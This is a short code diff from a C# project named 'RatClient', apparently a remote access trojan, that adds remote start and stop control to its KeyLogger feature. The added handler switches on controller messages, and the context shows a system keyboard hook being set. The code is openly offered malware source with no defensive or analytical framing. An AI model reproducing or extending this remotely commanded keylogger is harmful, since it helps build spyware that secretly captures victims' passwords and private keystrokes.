@@ -33,6 +33,24 @@ namespace RatClient.Features
         #endregion
 
         #region Methods
+        public KeyLogger()
+        {
+            Program.MessageReceived += HandleMessage;
+        }
+
+        private void HandleMessage(dynamic message)
+        {
+            switch (message["type"].ToString())
+            {
+                case "start_keylogger":
+                    Start();
+                    break;
+                case "stop_keylogger":
+                    Stop();
+                    break;
+            }
+        }
+
         public static void Start()
         {
             _hookID = SetHook(_proc);
